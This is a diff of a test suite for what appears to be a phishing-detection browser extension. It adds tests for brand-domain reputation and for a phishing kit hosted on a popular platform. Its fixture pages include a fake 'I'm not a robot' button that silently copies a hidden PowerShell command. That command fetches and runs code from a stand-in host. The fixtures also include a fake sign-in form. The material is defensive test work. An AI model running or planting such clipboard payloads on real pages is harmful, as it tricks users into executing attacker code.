@@ -20,6 +20,8 @@ const PAGES: Record<string, string> = {
     <button id="verify" onclick="var t=document.createElement('textarea');t.value='powershell -w hidden -c iex(irm http://evil.test/p)';t.style.position='fixed';t.style.left='-9999px';document.body.appendChild(t);t.select();document.execCommand('copy');">I'm not a robot</button>`,
   "/installer": `<!doctype html><title>Install</title><h1>Install the CLI</h1>
     <button id="copy" onclick="var t=document.createElement('textarea');t.value='curl -fsSL https://example.test/install.sh | sh';t.style.position='fixed';t.style.left='-9999px';document.body.appendChild(t);t.select();document.execCommand('copy');">Copy</button>`,
+  "/account": `<!doctype html><title>Sign in</title>
+    <form action="/session" method="post"><input type="email" name="email"><input type="password" name="password"><button>Sign in</button></form>`,
   "/dl": `<!doctype html><title>Downloads</title><a id="dl" href="/setup.exe" download>Download</a>`,
 };
 
@@ -104,6 +106,29 @@ test("a ClickFix fake captcha cannot put its command on the clipboard", async ()
   const page = await freshPage();
   await page.goto(`http://cdn-check.example:${port}/clickfix`);
   await page.locator("#verify").click();
+  await expect.poll(() => page.url(), { timeout: 8000 }).toContain("warning.html");
+  await page.close();
+});
+
+test("the worker loads the popularity list: a brand's secondary domain is not a lookalike", async () => {
+  const page = await freshPage();
+  await page.goto(`http://netflix.net:${port}/clean`);
+  await page.waitForTimeout(1200);
+  const ids = await worker.evaluate(async () => {
+    const all = await chrome.storage.session.get(null);
+    const record = Object.values(all).find((v) => (v as { url?: string }).url?.includes("netflix.net")) as
+      | { analysis?: { signals: { id: string; weightApplied: number }[] } }
+      | undefined;
+    return (record?.analysis?.signals ?? []).filter((s) => s.id === "popular" || s.weightApplied > 0).map((s) => s.id);
+  });
+  expect(ids).toContain("popular");
+  expect(ids).not.toContain("impersonation");
+  await page.close();
+});
+
+test("a kit on a popular platform does not borrow the platform's reputation", async () => {
+  const page = await freshPage();
+  await page.goto(`http://paypal-login.weebly.com:${port}/account`).catch(() => undefined);
   await expect.poll(() => page.url(), { timeout: 8000 }).toContain("warning.html");
   await page.close();
 });
